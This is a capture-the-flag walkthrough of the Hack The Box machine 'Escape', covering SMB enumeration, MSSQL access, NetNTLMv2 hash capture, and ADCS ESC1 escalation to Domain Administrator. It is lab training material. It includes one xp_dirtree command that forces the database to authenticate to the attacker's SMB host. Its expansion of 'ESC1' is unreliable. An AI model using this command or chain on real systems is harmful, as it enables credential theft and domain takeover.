# Escape - Hack The Box

## Enumeration
### Nmap
Nmap scan results showed services like LDAP and Kerberos, which are commonly used in Active Directory. This indicates the target is likely a Domain Controller.

### SMB
After enumerating SMB shares, I discovered a non-standard share named Public, which contained a readable PDF file related to SQL procedures.

The SQL Procedures file contained credentials for a guest user, which allowed us to authenticate to the MSSQL service.

## Exploitation
### Getting Service Account
To retrieve the service account running MSSQL, I set up an SMB server locally and executed the following command on the database:
EXEC master.sys.xp_dirtree '\\10.10.14.8\smbshare', 1, 1;

As a result, I captured the NetNTLMv2 hash on my SMB server.

I then proceeded to crack the captured hash.

### Getting User
Using the service account credentials, I performed credential harvesting and discovered user credentials stored within the SQL Server logs.

I then gained user access via Evil-WinRM, as the WinRM service was open.

## Privilege Escalation
### ADCS - ESC1
After gaining access to the user account, I was initially unsure how to proceed. Upon reviewing the hint, I realized that the environment had a vulnerable Active Directory Certificate Services (ADCS) setup.
I then used Certipy to enumerate the ADCS configuration and identified an ESC1 (Enrollment Services Configuration #1) vulnerability.

From there, the process was straightforward: I impersonated the Administrator account to request an ADCS certificate, then used that certificate to obtain a Kerberos Ticket Granting Ticket (TGT) encrypted with the Administrator’s NTLM hash, which I then extracted to recover the Administrator hash.

![12 - hash](https://github.com/user-attachments/assets/8973a740-83db-417b-a88f-752414a3ca77)

Finally, I executed a pass-the-hash attack with Evil‑WinRM and obtained an Administrator shell.

![13 - got it](https://github.com/user-attachments/assets/6d19738a-5842-4500-8330-4790d29710bd)

At that point, the machine was fully compromised.
